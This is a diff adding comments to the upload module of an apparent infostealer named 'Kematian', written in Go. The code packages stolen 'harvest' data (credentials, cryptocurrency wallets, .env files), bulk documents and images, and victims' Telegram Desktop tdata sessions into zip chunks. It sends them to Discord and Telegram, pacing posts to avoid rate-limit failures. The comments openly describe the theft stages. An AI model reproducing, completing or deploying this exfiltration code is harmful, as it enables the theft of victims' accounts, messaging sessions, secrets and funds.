@@ -1,3 +1,8 @@
+// upload.go — multi-phase delivery of harvest zips to Discord and/or Telegram.
+//
+// Order matters: primary harvest first (credentials/wallets), then bulk scanned
+// files, then Telegram tdata archives. Each zip is chunked under the destination
+// size limit; small delays between posts reduce 429 rate-limit failures.
 package main
 
 import (
@@ -7,6 +12,8 @@ import (
 	"recovery/recovery"
 )
 
+// uploadAllHarvest runs the three upload phases sequentially.
+// A failure in an earlier phase aborts later phases so partial runs are obvious.
 func uploadAllHarvest(cfg uploadConfig, hostname string, p *harvestPayload, quiet bool) error {
 	arch := p.Arch
 	if arch == "" {
@@ -38,6 +45,7 @@ func uploadAllHarvest(cfg uploadConfig, hostname string, p *harvestPayload, quie
 	return uploadVictimTelegram(cfg, baseFilename, p, quiet)
 }
 
+// uploadPrimaryHarvest builds and posts the priority zip (logs + wallets + env).
 func uploadPrimaryHarvest(cfg uploadConfig, baseFilename string, p *harvestPayload, maxChunk int, quiet bool) error {
 	chunks, err := buildPrimaryZipChunks(p, maxChunk)
 	if err != nil {
@@ -46,6 +54,8 @@ func uploadPrimaryHarvest(cfg uploadConfig, baseFilename string, p *harvestPaylo
 	return uploadZipChunks(cfg, baseFilename, "Kematian harvest", harvestSummary(p), chunks, "harvest", quiet)
 }
 
+// uploadScannedFiles posts phase-2 bulk files (documents/images/other).
+// .env files are excluded here — they ride along in the primary harvest.
 func uploadScannedFiles(cfg uploadConfig, baseFilename string, p *harvestPayload, maxChunk int, quiet bool) error {
 	fileCount := 0
 	if p != nil && p.Result != nil {
@@ -77,6 +87,8 @@ func uploadScannedFiles(cfg uploadConfig, baseFilename string, p *harvestPayload
 	return uploadZipChunks(cfg, filesBase, "Kematian files", scannedFilesSummary(fileCount, skippedLarge), chunks, "files", quiet)
 }
 
+// uploadVictimTelegram zips each discovered Telegram Desktop tdata directory
+// and uploads it as its own archive (often large; separate from harvest parts).
 func uploadVictimTelegram(cfg uploadConfig, baseFilename string, p *harvestPayload, quiet bool) error {
 	if p == nil || p.Result == nil || len(p.Result.Telegram) == 0 {
 		return nil
@@ -118,6 +130,8 @@ func uploadVictimTelegram(cfg uploadConfig, baseFilename string, p *harvestPaylo
 	return nil
 }
 
+// uploadZipChunks posts each zip part with part N/M metadata when split.
+// Filename pattern: {base}.zip or {base}-partN.zip
 func uploadZipChunks(cfg uploadConfig, baseFilename, title, summary string, chunks [][]byte, phaseLabel string, quiet bool) error {
 	if len(chunks) == 0 {
 		return nil
@@ -161,6 +175,8 @@ type uploadFileContext struct {
 	PartTotal int
 }
 
+// uploadSingleFile fans out one archive to every configured destination.
+// Both channels are attempted; errors are joined so a partial success is visible.
 func uploadSingleFile(cfg uploadConfig, title, summary, filename string, data []byte, ctx uploadFileContext) error {
 	var errs []string
 
@@ -189,6 +205,7 @@ func uploadSingleFile(cfg uploadConfig, title, summary, filename string, data []
 	return fmt.Errorf("%s", joinErrors(errs))
 }
 
+// uploadDelay spaces requests for whichever destinations are active.
 func uploadDelay(cfg uploadConfig) {
 	if cfg.useDiscord() {
 		discordUploadDelay()
